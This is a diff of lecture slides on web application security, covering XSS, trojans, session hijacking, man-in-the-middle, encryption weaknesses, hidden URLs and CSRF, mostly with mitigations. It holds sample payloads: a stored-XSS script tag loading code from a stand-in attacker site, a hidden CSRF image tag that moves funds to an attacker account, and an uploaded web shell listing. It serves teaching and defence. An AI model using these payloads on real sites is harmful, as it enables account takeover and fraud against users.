@@ -8,7 +8,7 @@
   - Cross site scripting (XSS)
   - Malicious file execution
   - Session hijacking
-  - Encryption
+  - Encryption attacks
   - Unsecured direct object reference
   - Failure to authorize/hidden URLs
   - Cross site request forgery (CSRF) 
@@ -75,7 +75,7 @@ Image credit: https://spanning.com/blog/cross-site-scripting-web-based-applicati
 ---
 ## Persistent XSS Attack Example
 
-- A trusted blog allows users to post comments exactly as entered by the users
+- A blog saves comments on posts exactly as entered by users
 - An attacker posts the following comment which contains a malicious payload
 
 ```html
@@ -83,7 +83,7 @@ Well thought out essay, loved it!!
 <script>http://attackerwebsite.com/maliciousscript.js</script>
 ```
 
-- When a victim goes to the page containing the comment, the payload in the comment executes
+- When a victim loads the page containing the comment, the payload in the comment executes
 - The attack payload remains in persistent storage on the server
 - Multiple users may become victims of the attack
 - Phishing is used to deceptively direct victims to the URL containing the payload
@@ -216,7 +216,7 @@ Select your language:
 ```html
   https://xss-game.appspot.com/level3/frame#2
 ```
-- If the user selects image one, then the URL is:
+- If the user selects image 1, then the URL is:
 ```html
     https://xss-game.appspot.com/level3/frame#1
 ```
@@ -261,37 +261,7 @@ Notes:
 
 ---
 
-## Other Defences Against XSS
 
-- Sanitize all untrusted content
-- If some HTML markup is allowed in untrusted input, sanitizing removes all the illegal input
-- For example, a comment section for a blog allows `<b>`, `<i>` and `<hr>` tags
-- The uploaded HTML is
-```html
-    <b>Well thought out essay, loved it!!</b>
-    <script>http://attackerwebsite.com/maliciousscript.js</script>
-```
-- The sanitized versions is
-```html
-    <b>Well thought out essay, loved it!!</b>
-```
-- Any untrusted content included in HTTP responses should be sanitized to prevent XSS reflection attacks
----
-
-## Sanitizing Libraries
-
-- There are multiple libraries that can be used for code sanitization
-- Some standard libraries are:
-- HTML sanitizer from _Google Closure Library_ (JavaScript/Node.js, docs)
-  - https://developers.google.com/closure/library/
-- DOMPurify (JavaScript, requires jsdom for Node.js)
-  - https://github.com/cure53/DOMPurify
-- PHP HTML Purifier 
-  - http://htmlpurifier.org/
-- Python Bleach
-  - https://pypi.org/project/bleach/
-
----
 
 ## Other XSS Preventive Measures
 
@@ -301,15 +271,15 @@ Notes:
 ```html
 Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld
 ```
-- Hold all user generated or untrusted content for review before writing
+- Hold all user generated or untrusted content for review before publishing
 
 ---
 ## Malicious File Execution
 
 - There are two basic types of malicious file execution
 - Client side attacks
-  - Malicious code is inserted into the client machine to intercept communications between the browser and the browser security mechanisms
-  - Often depends on social engineering to deceive users into installation
+  - Malicious code is inserted into the client machine to compromise its operations
+  - Often targets communications between the browser and the browser security mechanisms
 - Server side attacks
   - Malicious code is inserted into the server environment to execute on the server or to  interfere with the server operations
   - Often the result of poor security protocols on the server side
@@ -318,11 +288,12 @@ Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.t
 
 ## Client Side Attacks
 
-- The primary vector used in a client side attack is a Trojan
-  - Trojans are malicious code masquerading a trusted application or modify existing trusted applications
+- The primary type of software used in a client side attack is a Trojan
+  - Trojans are malicious code masquerading a trusted application
+  - Trojans can also modify existing trusted applications
   - One of the most common client side attacks
   - Enables other attacks like _session hijacking_ and _manipulator in the middle_
-- Other client side attack components are worms and viruses
+- Other client side malware deliver vectors are worms and viruses
   - Worms and viruses are used to propagate malware across systems
   - The payload of a worm or virus is often a Trojan
   
@@ -337,9 +308,9 @@ Image Credit: www.guru99.com/learn-everything-about-trojans-viruses-and-worms.ht
 ## Common Types of Trojans - RATs
 
 - _Remote Access Trojan (RAT):_ Allows attacker to take full control a computer
-  - Often disguised as a utility or incorporates itself into an existing program
+  - Often disguised as a utility or extension to an existing trusted program
   - Social Engineering often used to gain access to a machine for installation of the RAT
-- Ef. The _Windows Support Scam_ is a social engineering attack for RAT installation
+- Eg. The _Windows Support Scam_ is a social engineering attack for RAT installation
   - Users are served a phony webpage, shown on the next slide, often from some phishing attack
   - After calling the number, victims give scammers remote access to their computer
   - The scammers install a RAT disguised as an anti-virus or other utility
@@ -359,7 +330,7 @@ Image Credit: wolfstreet.com/2018/08/19/scam-critical-alert-from-microsoft-iexpl
 
 - _Data Sending Trojan_: Uses keylogger technology to capture sensitive data
   - Example passwords, credit card and banking information
-  - The data is then sent to the attacker
+  - Stolen data is sent to the attacker
 - Loggers are often part of malware with multiple functions or attacks
   - For example, collecting and sending all phone and computer data found on a computer
 - Often modifies the display of trusted web pages to request additional information to harvest
@@ -371,11 +342,11 @@ Image Credit: wolfstreet.com/2018/08/19/scam-critical-alert-from-microsoft-iexpl
 
 ![](../images/ZeusMalware3.jpg)
 
-- The Zeus malware was a very widespread and highly damaging Trojans
-- The main attack vector was a phishing email that with a URL for an XSS attack 
-- Victims who clicked on the URL would have Zeus installed on their computer  
+- The Zeus malware was a very widespread and highly damaging Trojan
+- The main attack vector was a phishing email containing a URL for an XSS attack 
+- Opening the URL installed Zeus on the victim's computer  
 - Zeus didn't masquerade as an application but rather modified existing applications
-- Currently, in "retirement," it is still the inspiration for many similar trojans
+- Currently not active, it is the basis for developing other trojans
 
 Notes:
 Image Credit: https://techieandwhatever.blogspot.com/2017/06/what-is-zeus-malware-and-how-does-it.html
@@ -384,12 +355,12 @@ Image Credit: https://techieandwhatever.blogspot.com/2017/06/what-is-zeus-malwar
 ## Other Trojan Types
 
 - _Destructive Trojan:_ Designed to destroy data stored a computer
-  - Ransomware is variation on this since the encrypted data is essentially destroyed
+  - Eg. Ransomware since the encrypted data is often never recovered
 - _Proxy Trojan:_ Uses the victim’s computer as a proxy server
   - Enables attackers to execute illicit acts from the infected computer
   - This is often used to creat BotNets or networks of controlled computers 
-- _FTP Trojan_: Uses port 21 to enable FTP file uploads to tje victim’s computer
-- _Security software disabler Trojan:_ Disables security software like firewall and antivirus software
+- _FTP Trojan_: Uses port 21 to enable FTP file uploads to the victim’s computer
+- _Security software disabler Trojan:_ Disables security software like firewalls and antivirus software
 - _Denial-of-Service attack Trojan:_ Designed to give the attacker ability to perform DOS attacks from victim’s computer.
 
 ---
@@ -400,7 +371,7 @@ Image Credit: https://techieandwhatever.blogspot.com/2017/06/what-is-zeus-malwar
 - Ransomware is the leading malware problems exemplified by 2021 cases like Colonial Pipeline, JBS Foods and the NBA
 - Typical attack vector is a phishing email using XSS attack to install the ransomware
 - Exploits vulnerabilities that allow running malicious code on the target computer (eg. unpatched security holes)
-- Ransomware can also be installed by a victim directly as part of what they believe is a legitimate application
+- Ransomware can also be installed by a victim via compromised applications
 
 Notes:
 
@@ -412,11 +383,11 @@ Image Credit: en.wikipedia.org/wiki/WannaCry_ransomware_attack#/media/File:Wana_
 
 - Since client attacks often start with an XSS attack, mitigating XSS attacks also helps prevent client side attacks
 - Trojans also spread via viruses and worms
-  - Upto date anti-virus and malware scanning tools can block these vectors
+  - Up to date anti-virus and malware scanning tools can block these vectors
   - Firewalls and other filtering tools can prevent access through open ports 
 - Malware exploits unpatched security holes which can be mitigated by regular system updates
 - Users and programs should have only the level of access required
-  - Eg. Administrative privileges for installing software are only granted for specific applications
+  - Eg. Administrative privileges for installing software are only granted for vetted applications
 
 ---
 
@@ -434,11 +405,11 @@ Image Credit: en.wikipedia.org/wiki/WannaCry_ransomware_attack#/media/File:Wana_
 - The first mode is to execute code on the server to control, damage or subvert the server
   - Installed malware can be used to harvest data, perform fraudulent actions or control the server
   - This often includes _backdoors_ to allow attackers access to the system
-  - Most of the scenarios and mitigations for client side attacks also apply
+  - Most of the scenarios and defences for client side attacks also apply
   - Some specific attacks are covered in _session hijacking_
 - The second mode is feed data to the server that is intended to cause existing programs on the server to be compromised
-  - One goal of this mode is to render the server inoperable
-  - Another is to put the server into an unstable state for further attacks
+  - The goals of this attack mode is to render the server inoperable
+  - Or to put the server into an unstable state to create vulnerabilities for further attacks
 ---
 ## OPM Hack and Data Breech
 
@@ -447,7 +418,7 @@ Image Credit: en.wikipedia.org/wiki/WannaCry_ransomware_attack#/media/File:Wana_
 - In 2015, the OPM disclosed that data on 21.5 million people had been stolen
   - Data stolen included millions of SF-86 forms 
   - SF-86 forms contain the personal information used to process security clearances
-- Considered one of the most devastating cyberattack ever on the US Government
+- Considered one of the most devastating cyberattacks of all time on the US Government
 
 Notes:
 
@@ -457,8 +428,8 @@ https://www.opm.gov/cybersecurity/cybersecurity-incidents/
 ---
 ## Office of Personal Management
 
-- How the hackers gained access has not been revealed
-- Likely through installation of malware by a compromised individual
+- How the hackers initially gained access has not been revealed
+- Likely through the direct installation of malware by a compromised individual
 - Once access was gained, hackers exfiltrated technical and administrative manuals for the system
 - Keyloggers on database adminstrators' terminals were installed
 - A backdoor into the system was also installed
@@ -505,7 +476,6 @@ Image Credit: techbytesonline.com/what-actually-is-zip-bomb-zip-of-death/
 - Session hijack attacks involve stealing the token from a victim's session
   - The attacker can now take the place of the real user and perform actions the real user would be allowed to do in the session
   - For example, hijacking an on-line banking session and transferring funds to the attacker's account
-- There are different types of session hijack attacks
 
 Notes:
 
@@ -522,16 +492,15 @@ Image Credit: www.netsparker.com/blog/web-security/session-hijacking/
 
 ## Session Hijacking
 
-- Session hijacking often requires obtaining the session token
+- A session hijacking requires obtaining the session token
 - There are several ways this is done
-  - Predicable session tokens
+  - Guessing predicable session tokens
   - Client side attacks, like XSS, to steal tokens
   - Trojans and malware on the client machine
   - Session sniffing
-- Session sniffing involves scanning HTTP traffic between a host and client to mine session tokens
-- Two common forms of attacks that are related to session hijacking are:
-  - Man in the Middle Attack
-  - Man in the Browser Attack
+- Two common forms of attacks that are enabled by session hijacking are:
+  - Manipulator in the Middle Attack
+  - Manipulator in the Browser Attack
 
 Notes:
 
@@ -543,7 +512,7 @@ Notes:
 
 - Vulnerability is due to poor security design
   - Eg. using the user ID or other piece of data as the session token
-- Short tokens are easier to guess or use brute force to spoof
+- Short tokens are easier to guess or to crack using brute force
 - Tokens that follow a predicable sequence can be predicted
 - To avoid this specific vulnerability
   - Use long and randomly generated session tokens
@@ -555,7 +524,7 @@ Image Credit: owasp.org/www-community/attacks/Session_Prediction
 
 ---
 
-## Sniffing
+## Sniffing Attacks
 
 ![](../images/Sniffing.png)
 
@@ -567,7 +536,7 @@ Image Credit: www.netsparker.com/blog/web-security/session-hijacking/
 
 ---
 
-## Sniffing
+## Sniffing Attacks
 
 
 - Attacker uses packet sniffing to monitor HTTP traffic and mine session tokens and credentials
@@ -577,21 +546,22 @@ Image Credit: www.netsparker.com/blog/web-security/session-hijacking/
   - Constantly changing session keys to invalidate any captured tokens
   - Use a VPN - All traffic move through and "encrypted channel" that cannot be sniffed
   - Avoid unsecured WiFi networks since you don't know who is listening
-  - Don't rely on just session keys to establish ID - use URLs, usage patterns or other identifying data
+  - Don't rely on just session keys to establish ID - use URLs, usage patterns or other identifying data as well
 
 Notes:
 
 ---
-## Man in the Middle Attack
+## Manipulator in the Middle Attack
 
 - Occurs when an attacker places themselves in a conversation between a victim and application
-- often used to eavesdrop on communications
+- Often used to eavesdrop on communications
   - Allows the attacker to collect credentials and other information
   - Typical target are interactions between users and financial institutions
   - Or any application that requires authentication
 - Also used to "spoof" or impersonate one of the parties
-  - Often used to create a vulnerability to be exploited by a later attack
+  - Used to create a vulnerability to be exploited by a later attack
   - For example, spoofing wikipedia to install malware on the target's computer
+  - NSA reportedly used a MitM attack to intercept traffic between targets and Google
 
 Notes:
 
@@ -605,6 +575,7 @@ Image Credit: www.imperva.com/learn/application-security/man-in-the-middle-attac
 - _IP Spoofing:_ Addresses in packet headers are altered so that traffic is routed to the attackers IP address
 - _ARP Spoofing:_ Links attackers MAC address to a user's IP address on a network by using fake ARP messages
 - _DNS Spoofing:_ Involves altering a DNS record so that users are sent to the attackers IP address
+- Neither party is aware that their traffic is passing through the attacker's spoof
 
 ![](../images/arp0.png)
 
@@ -616,27 +587,27 @@ Image Credit: thesslstore.com/blog/everything-you-need-to-know-about-arp-spoofin
 ## Mitigating MitM Attacks
 
 - Users should not use unsecured WiFi connections
-- Browser warning about unsecured websites may be an attempted MitM attack
+- Follow browser warnings about possible attempted MitM attack
 - Avoid using public networks - using VPNs is more secure
 - Servers should use robust communications protocols and encryption (TSL and HTTP) for every page
-- Timeouts to terminate idle applications
+- Timeouts to terminate idle applications to force new sessions
 ---
 
-## Man in the Browser Attacks
+## Manipulator in the Browser Attacks
 
-1[](../images/Man-in-the-Browser-Secret-Double-Octopus-1200x684.png)
+![](../images/Man-in-the-Browser-Secret-Double-Octopus-1200x684.png)
 
-- MitB attacks uses trojans to manipulate traffic before it reaches the browser
-  - Often done by infected libraries, browser extensions or helper applications
-- Enables manipulation of traffic before it goes through security layers
-- This is mitigated in the same way as other Trojan attacks
+- MitB attacks manipulate traffic before it reaches the browser security layers
+  - Enabled by trojans in infected libraries, browser extensions or helper applications
+- Mitigated by good malware defences and protocols
+- The Zeus trojan used MitB to add attacks to legitimate webpages
 
 Notes:
 
 Image Credit: doubleoctopus.com/security-wiki/threats-and-tools/man-in-the-browser-attack/
 
 ---
-## Encryption Attacks
+## Encryption Attack Vulnerabilities
 
 - Encryption attacks take a number of different forms
 - The most obvious is to find weaknesses where:
@@ -646,17 +617,17 @@ Image Credit: doubleoctopus.com/security-wiki/threats-and-tools/man-in-the-brows
   - Weak or easily cracked cryptographic keys and passwords ("qwerty123") are in use
 - Other weakness occur when:
   - Encryption is done poorly or inconsistently
-  - Failure to authenticate SSL certificates
+  - Authentication of SSL certificates is not done robustly
 
 ---
 
-## Ecryption Attack Examples
+## Encryption Vulnerability Examples
 
 - Data is automatically decrypted when retrieved via an SQL query
-  - Attacker could use an SQL injection attack to obtain information in clear text
+  - SQL injection attack could to obtain information in clear text
 - Simple hashes are used to store data
   - Attacker can crack hashes by brute force computation
-  - Rainbow tables are precomputed tables of output of hashing functions
+  - Rainbow tables are precomputed tables of output of hashing functions that allow for reverse engineering the hash
 - Poor key management
   - Attacker can gain access to the directories where keys are stored
   - Attacker can sniff keys included in messages or headers
@@ -670,8 +641,8 @@ Image Credit: doubleoctopus.com/security-wiki/threats-and-tools/man-in-the-brows
 - Keys are never hardcoded into applications
 - Logging and caching of keys or other cryptographic data is blocked
 - All sensitive data is encrypted at rest
-- Ensure all cryptographic algorithms and tools are up-to-date and support strong encryption
-- Avoid key leakage by using a secrets' manager like Hashicorp Vault
+- All cryptographic algorithms and tools are up-to-date and support strong encryption
+- Avoid key leakage by using a secrets manager like Hashicorp Vault
 - Keep all unnecessary sensitive data  (eg. old credit card info) in an inaccessible location
 - Encrypt all data in transit and enforce with protocols like HSTS - HTTP Strict Transport Security
 - Enforce strong and regularly changed passwords
@@ -682,10 +653,10 @@ Image Credit: doubleoctopus.com/security-wiki/threats-and-tools/man-in-the-brows
 
 - _HTTPS spoofing_ sends a fake certificate when the initial connection request to a secure site is made
   - Fake has a copy of the thumbprint associated with the compromised application 
-  - Can be used as part of a Man in the Middle attack
+  - Can be used as part of a MitM attack
 - _SSL BEAST_ exploits TLS version 1.0 vulnerability in SSL
   - The victim is infected with malicious JavaScript that captures encrypted cookies and enables the attacker
-cookies and authentication tokens.
+cookies and authentication tokens
 - _SSL hijacking_ is when an attacker passes forged authentication keys to both the user and application 
   - Sets up what appears to be a secure connection when but it's actually a MitM attack
 - _SSL stripping_ downgrades a HTTPS connection to HTTP by intercepting the TLS authentication
@@ -701,15 +672,15 @@ cookies and authentication tokens.
 
 ---
 
-## Direct Object Access Attack
+##  Unsecured Direct Object Access Attack
 
 - Exploits a badly configured server environment
-- Configuration and other files that manage the server are accessible to users
-- A common cause is keeping these files in the document root directory or a subdirectory
-- The contents of the file can be accessed via a web shell attack
-- Particularly dangerous when the attacker can run exectuable files
-- Mitigated by following best practices for servers and application configuration
-
+- Happens when implementation objects are exposed
+  - Eg. Configuration files, credentials, SQL queries
+- These objects can then be modified or destroyed
+- If implementation directories are accessible
+  - Attackers can add new files to compromise the system
+  - Creates an opportunity for malware installation
 ---
 
 ## Insecure Direct Object Reference
@@ -727,9 +698,9 @@ Image Credit:panning.com/blog/insecure-direct-object-reference-web-based-applica
 ![](../images)
 
 - Attacker is able to access implementation objects directly by guessing at their reference
-  - For example, guessing that the administrator account has account id "1" in the previous slide
-- Cause of a 2002 data breech at H&R Block where users' account number appeared in the URL
-  - Changing the number in the URL allowed access to other customers' accounts
+- Eg. guessing that the administrator account has account id "1" in the previous slide
+- Cause of a 2002 data breech at H&R Block where customer account numbers appeared in the URL
+- Changing the number in the URL allowed access to other customers' accounts
 
 ![](../images/HRBlock1.png)
 
@@ -741,7 +712,13 @@ Image Credit: www.cnet.com/tech/services-and-software/breach-exposes-h-r-block-c
 ---
 ## Insecure Direct Object Reference Mitigations
 
-
+- These attacks are possible when there is a lack of role authorization
+  - Users are able to access resources they should not be authorized for
+  - Mitigate by ensuring that there is an authentication mechanism
+  - Users can then only access the objects they are authorized for and are blocked from accessing other objects
+- Also mitigated by not exposing the reference to the object in a manner that can be recorded
+  - Eg. URL references "MyAccount" instead of account number
+  - Requires an addition step on the server to retrieve the object reference
 ---
 
 
@@ -763,40 +740,80 @@ drwxrwxr-x 2 secuser secuser 4096 Feb 27 20:43 .
 drwxr-xr-x 6 secuser secuser 4096 Feb 27 20:40 ..
 -rw-rw-r-- 1 secuser secuser 26 Feb 27 20:41 shell.php
 ```
----
-
-## Encryption
-
-Notes:
-
----
-
-
-## Unsecured Direct Object Access
-
-- Happens when implementation objects are exposed
-  - Eg. Configuration files, credentials, SQL queries
-- These objects can then be modified or destroyed
-- If implementation directories are accessible
-  - Attackers can add new files to compromise the system
-- 
-
-Notes:
-
+- Can also exploit open  ports and poorly configured ssh ports
+- Guessable root passwords create a vulnerability for ssh access
 ---
 
 ## Hidden URL Authorization Failure
 
-Notes:
+- Similar to the insecure direct object reference attack
+- Used to gain access to hidden resources or functionality
+- "Hidden" in this context means not made available to the user through the presentation layer
+- For example, an attacker notices that for user "bob," when the request to list accounts is made, the URL looks like
+```html
+  https://thebank.com/bob/ListAccounts
+```
+- By altering the URL, the attacker might be able to access other accounts if proper authorization is not done
+```html
+  https://thebank.com/manager/ListAccounts
+  https://thebank.com/admin/ListAccounts
+```
+
+---
+
+## Hidden URL Discovery
+
+- Various tools exist to search for hidden URLs
+- Fuzzing throws large amounts of random URls at the target
+  - Surprisingly effecting
+  - Also used in testing for this vulnerability
+- Dictionary attacks
+  - Tries to find URLs with a list of possible names based on common user
+  - Eg. config, web-config, users, admin, webadmin, etc
+
+---
+## Hidden URL Defences
+
+- Restrict access to authenticated users
+- Use role based permissions
+- Filter and block access to all unauthorized page types
+  - Eg. XML files, *.conf files, etc
+- Ensure that every page request is vetted
+  - If is not possible from the displayed page, it is rejected
+- Use fuzz testing and other testing tools to see if there are any accessible URLs that should not be accessed
 
 ---
 
 ## Cross Site Request Forgery
 
+- Forces victim to execute unwanted actions in a web application where they’re currently authenticated
+- Flow of the attack
+  - Victim authenticates to a site, web banking for example
+  - User clicks on an infected link that executes a banking request
+  - The bogus request is approved because it appears to come from the authenticated user
+- If the banking request would normally be submitted by the authenticated user as:
+```html
+http://bankx.com/app?action=transferFund&amount=3500&destinationAccount=991829
+```
+- Attacker engineers the victim to click load a page containing
+```html
+<img src = "http://bankx.com/app?action=transferFunds&amount=14000&destinationAccount=attackersAcct#" 
+   width = "0" height = "0" />
+```
+---
+## Cross Site Request Forgery
 
+![](../images/CSFR.png)
+
+- Example on the previous slide was contrived but captures the essence of the attack
+- While authenticated to a site, the attacker has the victim execute a malicious request to that site
+- The site assumes that it was the authenticated user that issued the request
+- For example, having user authenticated as an adimin click on a link that adds the attacker as an admin user
 
 Notes:
 
+Image Credit: spanning.com/blog/cross-site-forgery-web-based-application-security-part-2/cross-site-request-forgery-example/
+ 
 ---
 
 ## Labs
